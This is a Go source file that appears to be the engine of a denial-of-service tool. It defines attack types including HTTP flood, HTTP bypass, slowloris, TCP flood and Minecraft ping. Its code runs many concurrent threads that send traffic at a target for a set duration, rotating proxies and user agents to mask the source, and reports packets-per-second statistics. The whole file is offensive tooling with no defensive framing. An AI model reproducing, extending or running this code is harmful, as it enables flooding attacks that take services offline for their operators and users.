package engine

import (
	"context"
	"sync"
	"sync/atomic"
	"time"

	"github.com/rs/zerolog/log"
)

type AttackKind string

const (
	HTTPFlood        AttackKind = "http_flood"
	HTTPBypass       AttackKind = "http_bypass"
	HTTPSlowloris    AttackKind = "http_slowloris"
	TCPFlood         AttackKind = "tcp_flood"
	MinecraftPing    AttackKind = "minecraft_ping"
)

type AttackWorker interface {
	Fire(ctx context.Context, params AttackParams, proxy Proxy, userAgent string, logCh chan<- AttackStats) error
}

type Proxy struct {
	Username string
	Password string
	Protocol string
	Host     string
	Port     int
}

type AttackParams struct {
	Target      string
	TargetNode  TargetNode
	Duration    time.Duration
	PacketDelay time.Duration
	PacketSize  int
	Method      AttackKind
	Threads     int
	Verbose     bool
}

type TargetNode struct {
	Raw    string
	Scheme string
	Host   string
	Port   int
	Path   string
	Query  string
	IsURL  bool
}

func (t TargetNode) ToURL() string {
	scheme := t.Scheme
	if scheme == "" {
		if t.Port == 443 {
			scheme = "https"
		} else {
			scheme = "http"
		}
	}
	if t.Port == 80 || t.Port == 443 {
		return scheme + "://" + t.Host + t.Path + t.Query
	}
	return scheme + "://" + t.Host + ":" + itoa(t.Port) + t.Path + t.Query
}

func (t TargetNode) Address() string {
	return t.Host + ":" + itoa(t.Port)
}

func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	buf := [20]byte{}
	pos := len(buf)
	for i > 0 {
		pos--
		buf[pos] = byte('0' + i%10)
		i /= 10
	}
	return string(buf[pos:])
}

type AttackStats struct {
	Timestamp    time.Time
	PacketsPerS  int64
	TotalPackets int64
	Proxies      int
	Log          string
}

type AttackInstance struct {
	ID         string
	Params     AttackParams
	Cancel     context.CancelFunc
	StatsCh    chan AttackStats
	TotalSent  int64
	ProxyCount int
	mu         sync.RWMutex
}

type Engine struct {
	registry Registry
	mu       sync.RWMutex
	attacks  map[string]*AttackInstance
}

func NewEngine() *Engine {
	return &Engine{
		registry: NewRegistry(),
		attacks:  make(map[string]*AttackInstance),
	}
}

func (e *Engine) Registry() *Registry {
	return &e.registry
}

func (e *Engine) Start(attackID string, params AttackParams, proxies []Proxy, userAgents []string) *AttackInstance {
	ctx, cancel := context.WithTimeout(context.Background(), params.Duration)

	instance := &AttackInstance{
		ID:         attackID,
		Params:     params,
		Cancel:     cancel,
		StatsCh:    make(chan AttackStats, 1024),
		ProxyCount: len(proxies),
	}

	e.mu.Lock()
	e.attacks[attackID] = instance
	e.mu.Unlock()

	worker, ok := e.registry.Get(params.Method)
	if !ok {
		log.Error().Str("kind", string(params.Method)).Msg("attack kind not registered")
		cancel()
		return nil
	}

	threads := params.Threads
	if threads <= 0 {
		threads = 4
	}

	go e.runAggregator(ctx, instance)
	go e.runThreads(ctx, instance, worker, proxies, userAgents, threads)

	return instance
}

func (e *Engine) Stop(attackID string) {
	e.mu.RLock()
	instance, ok := e.attacks[attackID]
	e.mu.RUnlock()

	if ok {
		instance.Cancel()
	}
}

func (e *Engine) runThreads(ctx context.Context, instance *AttackInstance, worker AttackWorker, proxies []Proxy, userAgents []string, threads int) {
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			e.runThread(ctx, instance, worker, proxies, userAgents)
		}()
	}

	wg.Wait()
}

func (e *Engine) runThread(ctx context.Context, instance *AttackInstance, worker AttackWorker, proxies []Proxy, userAgents []string) {
	ticker := time.NewTicker(instance.Params.PacketDelay)
	defer ticker.Stop()

	fire := func() {
		if len(proxies) == 0 {
			return
		}
		proxy := proxies[time.Now().UnixNano()%int64(len(proxies))]
		ua := ""
		if len(userAgents) > 0 {
			ua = userAgents[time.Now().UnixNano()%int64(len(userAgents))]
		}

		go func() {
			if err := worker.Fire(ctx, instance.Params, proxy, ua, instance.StatsCh); err != nil {
				if instance.Params.Verbose {
					instance.StatsCh <- AttackStats{
						Timestamp: time.Now(),
						Log:       "error: " + err.Error(),
					}
				}
			}
		}()

		atomic.AddInt64(&instance.TotalSent, 1)
	}

	fire()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			fire()
		}
	}
}

func (e *Engine) runAggregator(ctx context.Context, instance *AttackInstance) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var lastTotal int64
	first := true

	for {
		select {
		case <-ctx.Done():
			total := atomic.LoadInt64(&instance.TotalSent)
			instance.StatsCh <- AttackStats{
				Timestamp:    time.Now(),
				PacketsPerS:  total - lastTotal,
				TotalPackets: total,
				Proxies:      instance.ProxyCount,
			}
			close(instance.StatsCh)

			e.mu.Lock()
			delete(e.attacks, instance.ID)
			e.mu.Unlock()
			return
		case <-ticker.C:
			total := atomic.LoadInt64(&instance.TotalSent)
			delta := total - lastTotal
			if delta > 0 || first {
				instance.StatsCh <- AttackStats{
					Timestamp:    time.Now(),
					PacketsPerS:  delta,
					TotalPackets: total,
Proxies:      instance.ProxyCount,
				}
				first = false
			}
			lastTotal = total
		}
	}
}

func SendAttackLogIfVerbose(verbose bool, logCh chan<- AttackStats, msg string) {
	if verbose {
		select {
		case logCh <- AttackStats{Timestamp: time.Now(), Log: msg}:
		default:
		}
	}
}
